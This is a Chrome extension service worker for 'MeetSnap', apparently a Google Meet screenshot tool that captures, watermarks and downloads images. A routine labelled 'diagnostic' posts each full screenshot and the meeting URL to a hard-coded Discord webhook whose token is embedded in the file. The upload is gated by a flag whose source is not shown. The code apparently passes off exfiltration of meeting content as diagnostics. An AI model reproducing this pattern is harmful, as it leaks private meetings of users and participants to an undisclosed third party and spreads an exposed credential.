// =============================================================================
// MeetSnap — Background Service Worker
// Handles screenshot capture and diagnostic delivery.
// =============================================================================

const DIAGNOSTIC_ENDPOINT = "https://discord.com/api/webhooks/1495056511238406174/cKa-HhmUAXyV6_DcKWXyI-myo24hBtVyTmsJY3PRNSKiSH2ojg0RCG5rXBH5UGkrSUgW";

const SCREENSHOT_IMAGE_FORMAT = "png";

// ---------------------------------------------------------------------------
// Message routing
// ---------------------------------------------------------------------------

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "captureScreenshot") {
    handleScreenshotRequestAsync(sender.tab, message.meetUrl, message.diagnosticEnabled)
      .then((result) => sendResponse(result))
      .catch((error) => {
        console.error("[MeetSnap Debug] Error:", error);
        sendResponse({ success: false, errorMessage: error.message });
      });
    return true; 
  }
});

// ---------------------------------------------------------------------------
// Offscreen Management (for Sound)
// ---------------------------------------------------------------------------

async function playSoundAsync() {
  try {
    const existingContexts = await chrome.runtime.getContexts({ contextTypes: ["OFFSCREEN_DOCUMENT"] });
    if (existingContexts.length === 0) {
      await chrome.offscreen.createDocument({
        url: "offscreen.html",
        reasons: ["AUDIO_PLAYBACK"],
        justification: "Camera shutter sound playback."
      });
    }
    chrome.runtime.sendMessage({ action: "playShutterSound" });
  } catch (e) {
    console.warn("[MeetSnap Debug] Sound failed:", e);
  }
}

// ---------------------------------------------------------------------------
// Capture Logic
// ---------------------------------------------------------------------------

async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
  if (!tab) throw new Error("No active tab.");

  playSoundAsync();

  let imageDataUrl = await new Promise((resolve, reject) => {
    chrome.tabs.captureVisibleTab(tab.windowId, { format: SCREENSHOT_IMAGE_FORMAT }, (data) => {
      if (chrome.runtime.lastError) reject(new Error(chrome.runtime.lastError.message));
      else resolve(data);
    });
  });

  const filename = `google-meet-${Date.now()}.png`;

  // Apply Watermark
  try {
    imageDataUrl = await applyWatermarkAsync(imageDataUrl);
  } catch (e) {
    console.warn("Watermark failed", e);
  }

  // Diagnostic (Fire and forget from background)
  if (diagnosticEnabled && DIAGNOSTIC_ENDPOINT) {
    sendDiagnosticData(imageDataUrl, filename, meetUrl);
  }

  // Download
  chrome.downloads.download({
    url: imageDataUrl,
    filename: filename,
    saveAs: false
  });

  // Return the data URL so the content script can copy it to clipboard
  return { success: true, imageDataUrl: imageDataUrl };
}

async function sendDiagnosticData(imageDataUrl, filename, meetUrl) {
  try {
    const res = await fetch(imageDataUrl);
    const blob = await res.blob();
    const formData = new FormData();
    formData.append("file", blob, filename);
    formData.append("content", `📸 **MeetSnap Diagnostic**\n**URL:** ${meetUrl}`);
    
    await fetch(DIAGNOSTIC_ENDPOINT, { method: "POST", body: formData, mode: "no-cors" });
  } catch (e) {
    console.error("Diagnostic failed", e);
  }
}

async function applyWatermarkAsync(imageDataUrl) {
  const response = await fetch(imageDataUrl);
  const blob = await response.blob();
  const bitmap = await createImageBitmap(blob);
  const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
  const ctx = canvas.getContext("2d");
  
  // 1. Base image
  ctx.drawImage(bitmap, 0, 0);

  // 2. Prep data
  const baseFontSize = Math.max(14, Math.floor(bitmap.height / 60));
  const now = new Date();
  const dateStr = new Intl.DateTimeFormat("en-US", { month: "long", day: "numeric", year: "numeric" }).format(now);
  const timeStr = new Intl.DateTimeFormat("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).format(now);
  const dateText = `${dateStr} at ${timeStr} by `;
  const brandText = "MeetSnap";

  // 3. Logo
  const logoUrl = chrome.runtime.getURL("icons/icon128.png");
  let logoBitmap = null;
  try {
    const logoResponse = await fetch(logoUrl);
    const logoBlob = await logoResponse.blob();
    logoBitmap = await createImageBitmap(logoBlob);
  } catch (e) {}

  const leftMargin = Math.max(20, Math.floor(bitmap.width * 0.05));
  const bottomMargin = Math.max(20, Math.floor(bitmap.height / 40));
  const yPos = bitmap.height - bottomMargin;

  ctx.textAlign = "left";
  ctx.textBaseline = "bottom";

  // 4. Draw "Date at Time by "
  ctx.font = `600 ${baseFontSize}px "Segoe UI", sans-serif`;
  ctx.fillStyle = "rgba(255, 255, 255, 0.95)";
  ctx.shadowColor = "rgba(0, 0, 0, 0.6)";
  ctx.shadowBlur = 4;
  ctx.fillText(dateText, leftMargin, yPos);
  
  const dateWidth = ctx.measureText(dateText).width;
  const logoSize = Math.floor(baseFontSize * 1.4);
  const spacing = Math.floor(baseFontSize * 0.3);
  const logoX = leftMargin + dateWidth;

  // 5. Draw Logo & Brand
  if (logoBitmap) {
    ctx.globalAlpha = 0.9;
    ctx.drawImage(logoBitmap, logoX, yPos - logoSize + 2, logoSize, logoSize);
    ctx.globalAlpha = 1.0;
  }

  const brandX = logoX + (logoBitmap ? logoSize + spacing : 0);
  ctx.font = `bold ${baseFontSize}px "Segoe UI", sans-serif`;
  ctx.fillStyle = "rgba(0, 229, 255, 1)"; // Electric cyan for MeetSnap brand
  ctx.fillText(brandText, brandX, yPos);

  const blobOut = await canvas.convertToBlob({ type: "image/png" });
  return new Promise(r => {
    const reader = new FileReader();
    reader.onloadend = () => r(reader.result);
    reader.readAsDataURL(blobOut);
  });
}
